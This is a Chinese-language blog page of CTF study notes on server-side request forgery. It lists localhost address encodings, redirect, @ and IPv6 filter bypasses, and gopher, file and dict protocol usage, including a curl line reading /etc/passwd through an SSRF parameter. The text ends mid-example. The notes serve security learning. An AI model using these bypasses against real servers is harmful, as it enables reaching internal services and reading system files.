@@ -1,0 +1,339 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>SSRF | Lengkur</title><meta name="author" content="Lengkur"><meta name="copyright" content="Lengkur"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="构造http请求时必须在每一句后面加上\r\n，结束时为\r\n\r\n，必须要空一行用于区分报文头和报文体 绕过ip绕过： 123456789全以127.0.0.1为例长整型： 2130706433十六进制： 全十六进制：0x7f000001 点分：0x7f.0x00.0x00.0x01 八进制： 点分：0177.0000.0000.0001混合： 十六+十：0x7f.0.0.1省略零简写：A.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSRF">
+<meta property="og:url" content="http://lengkur.github.io/2026/01/24/notes/SSRF/index.html">
+<meta property="og:site_name" content="Lengkur">
+<meta property="og:description" content="构造http请求时必须在每一句后面加上\r\n，结束时为\r\n\r\n，必须要空一行用于区分报文头和报文体 绕过ip绕过： 123456789全以127.0.0.1为例长整型： 2130706433十六进制： 全十六进制：0x7f000001 点分：0x7f.0x00.0x00.0x01 八进制： 点分：0177.0000.0000.0001混合： 十六+十：0x7f.0.0.1省略零简写：A.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://lengkur.github.io/img/comeboy2.jpg">
+<meta property="article:published_time" content="2026-01-24T06:52:25.000Z">
+<meta property="article:modified_time" content="2026-01-24T07:28:35.232Z">
+<meta property="article:author" content="Lengkur">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://lengkur.github.io/img/comeboy2.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "SSRF",
+  "url": "http://lengkur.github.io/2026/01/24/notes/SSRF/",
+  "image": "http://lengkur.github.io/img/comeboy2.jpg",
+  "datePublished": "2026-01-24T06:52:25.000Z",
+  "dateModified": "2026-01-24T07:28:35.232Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Lengkur",
+      "url": "http://lengkur.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/lengkur.png"><link rel="canonical" href="http://lengkur.github.io/2026/01/24/notes/SSRF/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.4-b1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":500,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'SSRF',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="/css/imgloaded.css"><link rel="stylesheet" href="/css/meteors.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.8.0/styles/atom-one-dark.min.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-butterfly-swiper/lib/swiper.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-butterfly-swiper/lib/swiperstyle.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/animate.min.css" media="print" onload="this.media='screen'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body><div id="loading-box" onclick="document.getElementById('loading-box').style.display='none'"><style>#loading-box {
+  position: fixed;
+  z-index: 1000;
+  width: 100vw;
+  height: 100vh;
+  background: #222;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  transition: opacity 0.5s; /* 增加消失时的淡出过渡 */
+}
+.loader {
+  position: relative;
+  width: 150px;
+  height: 150px;
+  background: transparent;
+  border-radius: 50%;
+  border: 2px solid transparent;
+  border-top-color: #00ffaa;
+  animation: spin 1.5s linear infinite;
+}
+.loader:before {
+  content: "";
+  position: absolute;
+  top: 5px;
+  left: 5px;
+  right: 5px;
+  bottom: 5px;
+  border-radius: 50%;
+  border: 2px solid transparent;
+  border-top-color: #00aaff;
+  animation: spin 3s linear infinite;
+}
+.loader:after {
+  content: "";
+  position: absolute;
+  top: 15px;
+  left: 15px;
+  right: 15px;
+  bottom: 15px;
+  border-radius: 50%;
+  border: 2px solid transparent;
+  border-top-color: #ff00aa;
+  animation: spin 1.5s linear infinite;
+}
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+[data-theme='light'] #loading-box {
+  background: #fff;
+}
+</style><div class="loader"></div><script>(function(){
+  const loadingBox = document.getElementById('loading-box');
+  
+  const removeLoading = () => {
+    if (!loadingBox) return;
+    loadingBox.style.opacity = '0';
+    setTimeout(() => {
+      loadingBox.style.display = 'none';
+    }, 500); // 等待0.5s过渡动画结束后彻底隐藏
+  }
+
+  // 1. 监听网页加载完成事件
+  window.addEventListener('load', removeLoading);
+  
+  // 2. 也是为了PJAX适配
+  document.addEventListener('pjax:complete', removeLoading);
+
+  // 3. 兜底机制：万一网络太卡，5秒后强制进入，防止一直卡死
+  setTimeout(removeLoading, 5000);
+})()</script></div><div class="bg-animation" id="web_bg" style="background-color: #000000;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/lengkur.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">70</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> WEB学习经历</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/notes/"><i class="fa-fw fas fa-book"></i><span> 笔记</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-pencil-alt"></i><span> Write Up</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/wp/"><i class="fa-fw fas fa-list-ul"></i><span> 全部文章</span></a></li><li><a class="site-page child" href="/categories/wp/ctfshow/"><i class="fa-fw fas fa-flag"></i><span> ctfshow</span></a></li><li><a class="site-page child" href="/categories/wp/NSSCTF-WEB/"><i class="fa-fw fas fa-skull"></i><span> NSSCTF</span></a></li><li><a class="site-page child" href="/categories/wp/BUUCTF/"><i class="fa-fw fas fa-biohazard"></i><span> BUUCTF</span></a></li><li><a class="site-page child" href="/categories/wp/%E4%B8%89%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF/"><i class="fa-fw fas fa-chess-rook"></i><span> CISCN</span></a></li><li><a class="site-page child" href="/categories/wp/DASCTF/"><i class="fa-fw fas fa-shield-alt"></i><span> DASCTF</span></a></li><li><a class="site-page child" href="/categories/wp/furryctf/"><i class="fa-fw fas fa-paw"></i><span> furryctf</span></a></li><li><a class="site-page child" href="/categories/wp/polarctf/"><i class="fa-fw fas fa-snowflake"></i><span> polarctf</span></a></li><li><a class="site-page child" href="/categories/wp/NSS-%E5%B7%A5%E5%9D%8Aweb%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"><i class="fa-fw fas fa-tools"></i><span> NSS工坊</span></a></li><li><a class="site-page child" href="/categories/wp/NSS%E6%98%9F%E8%BE%B0%E5%A4%A7%E6%B5%B7/"><i class="fa-fw fas fa-rocket"></i><span> NSS星辰大海</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-id-badge"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/comeboy2.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Lengkur</span></a><a class="nav-page-title" href="/"><span class="site-name">SSRF</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> WEB学习经历</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/notes/"><i class="fa-fw fas fa-book"></i><span> 笔记</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-pencil-alt"></i><span> Write Up</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/wp/"><i class="fa-fw fas fa-list-ul"></i><span> 全部文章</span></a></li><li><a class="site-page child" href="/categories/wp/ctfshow/"><i class="fa-fw fas fa-flag"></i><span> ctfshow</span></a></li><li><a class="site-page child" href="/categories/wp/NSSCTF-WEB/"><i class="fa-fw fas fa-skull"></i><span> NSSCTF</span></a></li><li><a class="site-page child" href="/categories/wp/BUUCTF/"><i class="fa-fw fas fa-biohazard"></i><span> BUUCTF</span></a></li><li><a class="site-page child" href="/categories/wp/%E4%B8%89%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF/"><i class="fa-fw fas fa-chess-rook"></i><span> CISCN</span></a></li><li><a class="site-page child" href="/categories/wp/DASCTF/"><i class="fa-fw fas fa-shield-alt"></i><span> DASCTF</span></a></li><li><a class="site-page child" href="/categories/wp/furryctf/"><i class="fa-fw fas fa-paw"></i><span> furryctf</span></a></li><li><a class="site-page child" href="/categories/wp/polarctf/"><i class="fa-fw fas fa-snowflake"></i><span> polarctf</span></a></li><li><a class="site-page child" href="/categories/wp/NSS-%E5%B7%A5%E5%9D%8Aweb%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"><i class="fa-fw fas fa-tools"></i><span> NSS工坊</span></a></li><li><a class="site-page child" href="/categories/wp/NSS%E6%98%9F%E8%BE%B0%E5%A4%A7%E6%B5%B7/"><i class="fa-fw fas fa-rocket"></i><span> NSS星辰大海</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-id-badge"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">SSRF</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-01-24T06:52:25.000Z" title="发表于 2026-01-24 14:52:25">2026-01-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-01-24T07:28:35.232Z" title="更新于 2026-01-24 15:28:35">2026-01-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/notes/">notes</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">1.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>5分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>构造http请求时必须在每一句后面加上\r\n，结束时为\r\n\r\n，必须要空一行用于区分报文头和报文体</p>
+<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p><strong>ip绕过：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs asp">全以127.0.0.1为例<br>长整型： 2130706433<br>十六进制： 全十六进制：0x7f000001 点分：0x7f.0x00.0x00.0x01 <br>八进制： 点分：0177.0000.0000.0001<br>混合： 十六+十：0x7f.0.0.1<br>省略零简写：A.B形式：127.1	A.B.C形式：10.0.513对应10.0.2.1 因为513溢出<br>http://0：有时可以来代替http://127.0.0.1<br><br>sudo.cc：解析到本地的域名，无数字绕过，http://sudo.cc<br></code></pre></td></tr></table></figure>
+
+<p><strong>location绕过：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">在服务器弄一个locationlocal.php文件<br>内容类似：<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;http://127.0.0.1/flag.php&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br>题目传参：http:<span class="hljs-comment">//101.37.210.236/locationlocal.php</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>@截断：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php">例：<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^http:\/\/ctf\..*show$/i&#x27;</span>,<span class="hljs-variable">$url</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>url=http:<span class="hljs-comment">//ctf.@127.0.0.1/flag.php?show</span><br>RFC <span class="hljs-number">3986</span>标准中，一个标准url结构为scheme:<span class="hljs-comment">//[user:password@]host[:port]/path</span><br>解析器会认为ctf为用户名，<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>才是目标地址<br></code></pre></td></tr></table></figure>
+
+<p>IPv6混合地址绕过</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html">/127.0.0.1的IPv6写法<br>http://[0:0:0:0:0:ffff:127.0.0.1]<br>http://[::ffff:127.0.0.1]<br>http://[::ffff:7f00:1]<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>parse_url：把url字符串拆解成组成部分</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php">例子：<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span>=<span class="hljs-string">&quot;https://www.example.com:8080/path/to/page.php?id=123&amp;s=search#top&quot;</span>;<br><span class="hljs-variable">$parts</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$parts</span>);<br><span class="hljs-meta">?&gt;</span><br>结果:<br>Array&#123;<br>[scheme] =&gt; https<br>[host] =&gt; www.example.com<br>[port] =&gt; <span class="hljs-number">8080</span><br>[path] =&gt; /path/to/page.php<br>[query] =&gt; id=<span class="hljs-number">123</span>&amp;s=search<br>[fragment] =&gt; top	<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>gethostbyname：通过域名获取对应IP，DNS解析</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asp">可以解除所有表示法，返回十进制点分格式<br></code></pre></td></tr></table></figure>
+
+<p>filter_var：过滤器，用于验证和清理(如去除HTML标签，转义特殊符号)</p>
+<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs mel">语法：<span class="hljs-keyword">filter</span>)_ var($变量,$过滤器常量,$标志或选项)<br><br>验证常量：<br>FILTER_VALIDATE_IP：验证IPv4/IPv6<br>FILTER_VALIDATE_BOOLEAN：验证布尔值(支持<span class="hljs-string">&quot;yes&quot;</span>,<span class="hljs-string">&quot;true&quot;</span>,<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-number">1</span>)<br>清理常量：<br>FILTER_SANITIZE_NUMBER_INT：只保留数组和正负号<br>FILTER_SANITIZE_SPECIAL_CHARS：转义HTML特殊字符(防XSS)<br>标志常量：<br>FILTER_FLAG_IPV4：只允许ipv4<br>FILTER_FLAG_IPV6：只允许ipv6<br>FILTER_FLAG_NO_PRIV_RANGE：禁止私有网段<br>FILTER_FLAG_NO_RES_RANGE：禁止保留网段<br></code></pre></td></tr></table></figure>
+
+<p>url_getinfo：发起网络请求后，获取这个请求的统计信息</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">例：<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-string">&quot;https://www.google.com&quot;</span>);<br><span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-variable">$info</span>=<span class="hljs-title function_ invoke__">curl_getinfo</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;HTTP状态码&#x27;</span>.<span class="hljs-variable">$info</span>[<span class="hljs-string">&#x27;http_code&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;传输耗时&#x27;</span>.<span class="hljs-variable">$info</span>[<span class="hljs-string">&#x27;total_time&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;最终访问的url&#x27;</span>.<span class="hljs-variable">$info</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="常用协议"><a href="#常用协议" class="headerlink" title="常用协议"></a>常用协议</h2><p>gopher：用于发送构造的请求包，要进行url编码，ssrf攻击时要进行两次url编码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">gopher:<span class="hljs-comment">//&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后面接TCP数据流 </span><br><br>例子：<br>curl gopher:<span class="hljs-comment">//192.168.0.12:18080/_POST%20/test/test.php%20HTTP/1.1%0d%0AHost:%20192.168.0.12:18080%0d%0AContent-Type:%20application/x-www-form-urlencoded%0d%0AContent-Length:%2011%0d%0A%0d%0Aname=gopher</span><br><br>工具：gopherus，可以辅助我们生成请求，用法如：<br>    gopherus --exploit mysql		<span class="hljs-comment">//mysql数据库</span><br>    gopherus --exploit redis		<span class="hljs-comment">//redis数据库</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>file：用于访问本地文件系统的URI协议，它允许通过URI来直接引用文件系统中的文件。 file协议可以查看本地的文件，如果存在ssrf漏洞的主机挂载了一些内网的资源，就可以借助ssrf漏洞访问内网的资源</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">格式：file:<span class="hljs-comment">///path/to/file</span><br>curl http:<span class="hljs-comment">//192.168.173.88/?url=file:///etc/passwd</span><br></code></pre></td></tr></table></figure>
+
+<p>dict:&#x2F;&#x2F; 字典服务器协议，访问字典资源，如，dict:&#x2F;&#x2F;&#x2F;ip:6739&#x2F;info：<br>sftp:&#x2F;&#x2F; SSH文件传输协议或安全文件传输协议<br>ldap:&#x2F;&#x2F; 轻量级目录访问协议<br>tftp:&#x2F;&#x2F; 简单文件传输协议</p>
+<h2 id="常见漏洞函数"><a href="#常见漏洞函数" class="headerlink" title="常见漏洞函数"></a>常见漏洞函数</h2><p>file_get_contents()：读取文件内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 从本地文件中读取内容</span><br><span class="hljs-variable">$file_contents</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;./demo.txt&quot;</span>);<br><span class="hljs-comment">// 从远程文件中读取内容</span><br><span class="hljs-variable">$url_contents</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;http://example.com/&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>fsockopen()：用于连接服务器与其通信</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php">格式：resource <span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$hostname</span>, <span class="hljs-keyword">int</span> <span class="hljs-variable">$port</span> = -<span class="hljs-number">1</span>, <span class="hljs-keyword">int</span> &amp;<span class="hljs-variable">$errno</span> = <span class="hljs-literal">null</span>, <span class="hljs-keyword">string</span> &amp;<span class="hljs-variable">$errstr</span> = <span class="hljs-literal">null</span>, <span class="hljs-keyword">float</span> <span class="hljs-variable">$timeout</span> = <span class="hljs-literal">null</span>)<br><span class="hljs-variable">$hostname</span> ：要连接的主机名或 IP 地址。<br><span class="hljs-variable">$port</span> ：可选参数，默认为 -<span class="hljs-number">1</span> 。要连接的端口号。如果未指定端口，则使用默认端口。<br><span class="hljs-variable">$errno</span> ：可选参数，默认为 <span class="hljs-literal">null</span> 。如果连接失败，则返回错误代码。<br><span class="hljs-variable">$errstr</span> ：可选参数，默认为 <span class="hljs-literal">null</span> 。如果连接失败，则返回错误消息。<br><span class="hljs-variable">$timeout</span> ：可选参数，默认为 <span class="hljs-literal">null</span> 。连接超时时间，以秒为单位。如果在指定的时间内无法建立连接，则函数返回 <span class="hljs-literal">false</span> 。<br><br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$socket</span> = <span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-string">&#x27;www.baidu.com&#x27;</span>, <span class="hljs-number">80</span>, <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-number">30</span>);<br>    <span class="hljs-comment">// 与www.baidu.com:80建立连接</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$socket</span>) &#123;<br>    <span class="hljs-comment">// 连接成功</span><br>    <span class="hljs-variable">$request</span> = <span class="hljs-string">&quot;GET / HTTP/1.1\r\n&quot;</span>;<br>    <span class="hljs-variable">$request</span> .= <span class="hljs-string">&quot;Host: www.baidu.com\r\n&quot;</span>;<br>    <span class="hljs-variable">$request</span> .= <span class="hljs-string">&quot;Connection: Close\r\n\r\n&quot;</span>;<br>    <span class="hljs-comment">// $request此时构造了一个http的请求头，想要请求www.baidu路径内容</span><br>    <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$socket</span>, <span class="hljs-variable">$request</span>);<br>    <span class="hljs-comment">// 